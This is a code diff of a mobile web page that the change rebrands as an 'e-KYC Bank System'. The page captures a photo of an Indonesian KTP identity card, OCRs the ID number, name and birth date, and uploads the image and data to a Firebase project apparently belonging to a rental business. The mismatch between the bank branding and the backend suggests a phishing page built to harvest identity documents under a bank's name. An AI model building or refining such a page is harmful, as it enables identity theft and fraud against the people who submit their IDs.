@@ -3,198 +3,66 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verifikasi Pelanggan</title>
+<title>e-KYC Bank System</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
 <script src="https://cdn.jsdelivr.net/npm/tesseract.js@4/dist/tesseract.min.js"></script>
 
 <style>
-body{
- margin:0;
- background:#000;
- color:#fff;
- font-family:'Orbitron';
- text-align:center;
-}
-
-.frame{
- width:85%;
- max-width:420px;
- aspect-ratio:10/6;
- border:2mm solid #888;
- margin:20px auto;
- border-radius:10px;
- background:#111;
- display:flex;
- justify-content:center;
- align-items:center;
- position:relative;
-}
-
-.frame img{
- width:100%;
- height:100%;
- object-fit:cover;
- display:none;
-}
-
-.label{
- position:absolute;
- color:#00aaff;
-}
-
-.btn-foto{
- width:85%;
- max-width:420px;
- padding:14px;
- margin:10px auto;
- background:linear-gradient(45deg,#003366,#0055aa);
- color:#000;
- font-weight:900;
- border:none;
- border-radius:8px;
- cursor:pointer;
-}
-
-.form{display:none;}
-
-.input{
- width:85%;
- max-width:420px;
- padding:10px;
- margin:5px auto;
- border-radius:6px;
- border:none;
-}
-
-.checkbox{
- display:none;
- width:85%;
- max-width:420px;
- margin:10px auto;
- font-size:12px;
- text-align:left;
-}
-
-#loadingScreen{
- position:fixed;
- top:0;left:0;
- width:100%;height:100%;
- background:#000;
- display:none;
- justify-content:center;
- align-items:center;
- flex-direction:column;
- z-index:999;
-}
-
-.loader{
- border:5px solid #222;
- border-top:5px solid #00aaff;
- border-radius:50%;
- width:50px;
- height:50px;
- animation:spin 1s linear infinite;
-}
-
-@keyframes spin{
- 0%{transform:rotate(0);}
- 100%{transform:rotate(360deg);}
-}
-
-#popupSuccess{
- position:fixed;
- top:0;left:0;
- width:100%;height:100%;
- background:rgba(0,0,0,0.7);
- display:none;
- justify-content:center;
- align-items:center;
-}
-
-.popup-box{
- background:#111;
- padding:25px;
- border-radius:12px;
- width:80%;
- max-width:320px;
-}
-
-#btnLanjut{
- width:100%;
- padding:12px;
- background:linear-gradient(45deg,#007bff,#00aaff);
- color:#000;
- font-weight:bold;
- border:none;
- border-radius:8px;
-}
-
-#uploadBar{
- width:85%;
- max-width:420px;
- margin:10px auto;
- display:none;
-}
-
-#uploadBar div{
- height:10px;
- background:#222;
- border-radius:10px;
- overflow:hidden;
-}
-
-#uploadProgress{
- height:100%;
- width:0%;
- background:#00aaff;
-}
+body{margin:0;background:#000;color:#fff;font-family:'Orbitron';text-align:center;}
+.frame{width:85%;max-width:420px;aspect-ratio:10/6;border:2mm solid #888;margin:20px auto;border-radius:10px;background:#111;display:flex;justify-content:center;align-items:center;position:relative;}
+.frame img{width:100%;height:100%;object-fit:cover;display:none;}
+.label{position:absolute;color:#00aaff;}
+.btn{width:85%;max-width:420px;padding:14px;margin:10px auto;background:linear-gradient(45deg,#003366,#0055aa);color:#000;font-weight:900;border:none;border-radius:8px;cursor:pointer;}
+.input{width:85%;max-width:420px;padding:10px;margin:5px auto;border-radius:6px;border:none;}
+.checkbox{display:none;width:85%;max-width:420px;margin:10px auto;font-size:12px;text-align:left;}
+#loadingScreen{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:none;justify-content:center;align-items:center;flex-direction:column;z-index:999;}
+.loader{border:5px solid #222;border-top:5px solid #00aaff;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;}
+@keyframes spin{100%{transform:rotate(360deg);}}
+#uploadBar{width:85%;max-width:420px;margin:10px auto;display:none;}
+#uploadBar div{height:10px;background:#222;border-radius:10px;overflow:hidden;}
+#uploadProgress{height:100%;width:0%;background:#00aaff;}
+#popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);display:none;justify-content:center;align-items:center;}
+.popup-box{background:#111;padding:20px;border-radius:10px;}
 </style>
-</head>
 
+</head>
 <body>
 
-<h2>VERIFIKASI PELANGGAN</h2>
+<h2>VERIFIKASI e-KYC BANK</h2>
 
 <div class="frame">
  <img id="preview">
- <div class="label" id="label">FOTO DOKUMEN</div>
+ <div class="label" id="label">FOTO KTP</div>
 </div>
 
-<button type="button" class="btn-foto" id="btnFoto">AMBIL FOTO</button>
+<input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>
+<button class="btn" id="btnFoto">AMBIL FOTO KTP</button>
 
-<div class="form" id="formOCR">
- <input class="input" id="nik" placeholder="Nomor Identitas">
- <input class="input" id="nama" placeholder="Nama Lengkap">
- <input class="input" id="ttl" placeholder="Tanggal Lahir (DD / MM / YYYY)">
-</div>
+<input class="input" id="nik" placeholder="NIK">
+<input class="input" id="nama" placeholder="Nama">
+<input class="input" id="ttl" placeholder="TTL (DD / MM / YYYY)">
 
 <div class="checkbox" id="box">
- <input type="checkbox" id="check">
- Saya setuju data sudah sesuai dokumen
+ <input type="checkbox" id="check"> Data sudah sesuai
 </div>
 
 <div id="uploadBar">
- <div>
-  <div id="uploadProgress"></div>
- </div>
+ <div><div id="uploadProgress"></div></div>
  <p id="uploadText">Upload 0%</p>
 </div>
 
 <div id="loadingScreen">
  <div class="loader"></div>
- <p id="loadingText">Memproses... 0%</p>
+ <p id="loadingText">Memproses OCR...</p>
 </div>
 
-<div id="popupSuccess">
+<div id="popup">
  <div class="popup-box">
-  <h3>Verifikasi Berhasil</h3>
-  <p>Data pelanggan berhasil dikirim</p>
-  <button id="btnLanjut">LANJUTKAN</button>
+  <h3>Berhasil</h3>
+  <button onclick="next()">LANJUT</button>
  </div>
 </div>
-
-<input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>
 
 <script type="module">
 
@@ -202,196 +70,124 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/fireba
 import { getStorage, ref, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
 import { getFirestore, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
-/* FIREBASE */
+// ================= FIREBASE =================
 const firebaseConfig = {
-  apiKey: "AIzaSyAXMiJ8u65ex6D3LtbrzKyEKhAeGtg7Zps",
-  authDomain: "nskrental-bbf87.firebaseapp.com",
-  projectId: "nskrental-bbf87",
-  storageBucket: "nskrental-bbf87.appspot.com",
-  appId: "1:654715207587:web:73f5281b0fdcdecf8c6416"
+ apiKey: "AIzaSyAXMiJ8u65ex6D3LtbrzKyEKhAeGtg7Zps",
+ authDomain: "nskrental-bbf87.firebaseapp.com",
+ projectId: "nskrental-bbf87",
+ storageBucket: "nskrental-bbf87.appspot.com",
+ appId: "1:654715207587:web:73f5281b0fdcdecf8c6416"
 };
 
 const app = initializeApp(firebaseConfig);
 const storage = getStorage(app);
 const db = getFirestore(app);
 
-/* ELEMENT */
-const btnFoto = document.getElementById("btnFoto");
-const cameraInput = document.getElementById("cameraInput");
-const preview = document.getElementById("preview");
-const label = document.getElementById("label");
+// ================= ELEMENT =================
+const btnFoto=document.getElementById("btnFoto");
+const cameraInput=document.getElementById("cameraInput");
+const preview=document.getElementById("preview");
+const nik=document.getElementById("nik");
+const nama=document.getElementById("nama");
+const ttl=document.getElementById("ttl");
+const check=document.getElementById("check");
+const box=document.getElementById("box");
+const loading=document.getElementById("loadingScreen");
+const uploadBar=document.getElementById("uploadBar");
+const uploadProgress=document.getElementById("uploadProgress");
+const uploadText=document.getElementById("uploadText");
+const popup=document.getElementById("popup");
 
-const nik = document.getElementById("nik");
-const nama = document.getElementById("nama");
-const ttl = document.getElementById("ttl");
+let fileBlob=null;
 
-const formOCR = document.getElementById("formOCR");
-const box = document.getElementById("box");
-const check = document.getElementById("check");
+// ================= CAMERA =================
+btnFoto.onclick=()=>cameraInput.click();
 
-const loadingScreen = document.getElementById("loadingScreen");
-const loadingText = document.getElementById("loadingText");
+cameraInput.onchange=async e=>{
+ const file=e.target.files[0];
+ fileBlob=file;
+ preview.src=URL.createObjectURL(file);
+ preview.style.display="block";
+ document.getElementById("label").style.display="none";
 
-const uploadBar = document.getElementById("uploadBar");
-const uploadProgress = document.getElementById("uploadProgress");
-const uploadText = document.getElementById("uploadText");
+ loading.style.display="flex";
 
-const popupSuccess = document.getElementById("popupSuccess");
-const btnLanjut = document.getElementById("btnLanjut");
+ const img=new Image();
+ img.src=preview.src;
+ await new Promise(r=>img.onload=r);
 
-let fileBlob = null;
+ const canvas=document.createElement("canvas");
+ const ctx=canvas.getContext("2d");
 
-/* CAMERA */
-btnFoto.addEventListener("click", () => {
- cameraInput.value = "";
- cameraInput.click();
-});
+ canvas.width=1000;
+ canvas.height=(img.height/img.width)*1000;
 
-/* FORMAT TANGGAL */
-ttl.addEventListener("input", e => {
- let v = e.target.value.replace(/\D/g,"").slice(0,8);
- e.target.value = v.replace(/(\d{2})(\d{2})(\d{4})/,"$1 / $2 / $3");
-});
+ ctx.drawImage(img,0,0,canvas.width,canvas.height);
 
-/* OCR */
-function extract(t){
- t = t.replace(/\s+/g,' ');
- let nik = (t.match(/\b\d{16}\b/)||[""])[0];
- let nama = ((t.match(/NAMA\s*[:\-]?\s*([A-Z\s]+)/)||["",""])[1]).trim();
- let ttlRaw = t.match(/(\d{2})[\/\-]?(\d{2})[\/\-]?(\d{4})/);
- let ttl = ttlRaw ? `${ttlRaw[1]} / ${ttlRaw[2]} / ${ttlRaw[3]}` : "";
- return {nik,nama,ttl};
-}
+ let data=ctx.getImageData(0,0,canvas.width,canvas.height);
+ let d=data.data;
 
-/* VALIDASI */
-function validateData(nikVal,namaVal,ttlVal){
- if(!nikVal) return "Nomor identitas kosong";
- if(namaVal.length < 3) return "Nama tidak valid";
- if(!ttlVal) return "Tanggal lahir belum diisi";
- return null;
-}
-
-/* PROSES FOTO */
-cameraInput.addEventListener("change", async e => {
- const file = e.target.files[0];
- if(!file) return;
-
- fileBlob = file;
-
- preview.src = URL.createObjectURL(file);
- preview.style.display = "block";
- label.style.display = "none";
-
- loadingScreen.style.display = "flex";
-
- try{
-  console.log("OCR mulai...");
-
-  /* ===== PREPROCESS IMAGE ===== */
-  const img = new Image();
-  img.src = URL.createObjectURL(file);
-
-  await new Promise(res => img.onload = res);
-
-  const canvas = document.createElement("canvas");
-  const ctx = canvas.getContext("2d");
-
-  const maxWidth = 1000;
-  const scale = maxWidth / img.width;
-
-  canvas.width = maxWidth;
-  canvas.height = img.height * scale;
-
-  ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-
-  let imageData = ctx.getImageData(0,0,canvas.width,canvas.height);
-  let data = imageData.data;
-
-  // grayscale + threshold biar teks tajam
-  for(let i=0;i<data.length;i+=4){
-    let avg = (data[i]+data[i+1]+data[i+2])/3;
-    avg = avg > 140 ? 255 : 0;
-    data[i]=data[i+1]=data[i+2]=avg;
-  }
-
-  ctx.putImageData(imageData,0,0);
-
-  /* ===== OCR ===== */
-  const result = await Tesseract.recognize(canvas,'eng+ind',{
-   logger:m=>{
-    if(m.status==="recognizing text"){
-     loadingText.innerText="Memproses... "+Math.round(m.progress*100)+"%";
-    }
-   }
-  });
-
-  console.log("HASIL OCR:", result.data.text);
-
-  const hasil = result.data.text.toUpperCase();
-  const parsed = extract(hasil);
-
-  nik.value = parsed.nik;
-  nama.value = parsed.nama;
-  ttl.value = parsed.ttl;
-
-  formOCR.style.display = "block";
-  box.style.display = "block";
-
- }catch(err){
-  alert("OCR gagal / tidak terbaca");
-  console.error(err);
+ for(let i=0;i<d.length;i+=4){
+  let v=(d[i]+d[i+1]+d[i+2])/3;
+  v=v>140?255:0;
+  d[i]=d[i+1]=d[i+2]=v;
  }
 
- loadingScreen.style.display = "none";
-});
+ ctx.putImageData(data,0,0);
 
-/* UPLOAD */
-check.addEventListener("change", () => {
- if(!check.checked || !fileBlob) return;
+ const result=await Tesseract.recognize(canvas,'eng+ind');
+ const text=result.data.text.toUpperCase();
 
- const error = validateData(nik.value,nama.value,ttl.value);
- if(error){
-  alert(error);
-  check.checked = false;
-  return;
- }
+ nik.value=(text.match(/\b\d{16}\b/)||[""])[0];
+ nama.value=((text.match(/NAMA\s*[:\-]?\s*([A-Z\s]+)/)||["",""])[1]);
+ const ttlRaw=text.match(/(\d{2})[\/\-]?(\d{2})[\/\-]?(\d{4})/);
+ ttl.value=ttlRaw?`${ttlRaw[1]} / ${ttlRaw[2]} / ${ttlRaw[3]}`:"";
 
- const fileName = "dokumen_"+Date.now()+".jpg";
- const storageRef = ref(storage,fileName);
- const uploadTask = uploadBytesResumable(storageRef,fileBlob);
+ loading.style.display="none";
+ box.style.display="block";
+}
 
- uploadBar.style.display = "block";
+// ================= VALIDASI =================
+function validate(){
+ if(!nik.value||nik.value.length!==16)return false;
+ if(nama.value.length<3)return false;
+ if(!ttl.value)return false;
+ return true;
+}
 
- uploadTask.on("state_changed",
+// ================= UPLOAD =================
+check.onchange=()=>{
+ if(!check.checked||!fileBlob)return;
+ if(!validate()){alert("Data invalid");check.checked=false;return;}
 
- (snapshot)=>{
-  let percent = Math.round((snapshot.bytesTransferred/snapshot.totalBytes)*100);
-  uploadProgress.style.width = percent+"%";
-  uploadText.innerText = "Upload "+percent+"%";
+ const name="ktp_"+Date.now()+".jpg";
+ const storageRef=ref(storage,name);
+ const task=uploadBytesResumable(storageRef,fileBlob);
+
+ uploadBar.style.display="block";
+
+ task.on("state_changed",snap=>{
+  let p=Math.round((snap.bytesTransferred/snap.totalBytes)*100);
+  uploadProgress.style.width=p+"%";
+  uploadText.innerText="Upload "+p+"%";
  },
-
- (error)=>{
-  alert("Upload gagal: "+error.message);
- },
-
- async ()=>{
+ err=>alert(err.message),
+ async()=>{
   await addDoc(collection(db,"verifikasi"),{
-   identitas:nik.value,
+   nik:nik.value,
    nama:nama.value,
-   tanggal_lahir:ttl.value,
-   file:fileName,
+   ttl:ttl.value,
+   file:name,
    createdAt:serverTimestamp()
   });
 
-  popupSuccess.style.display = "flex";
- }
- );
-});
+  popup.style.display="flex";
+ });
+}
 
-/* LANJUT */
-btnLanjut.addEventListener("click",()=>{
+function next(){
  window.location.href="index3.html";
-});
+}
 
 </script>
 
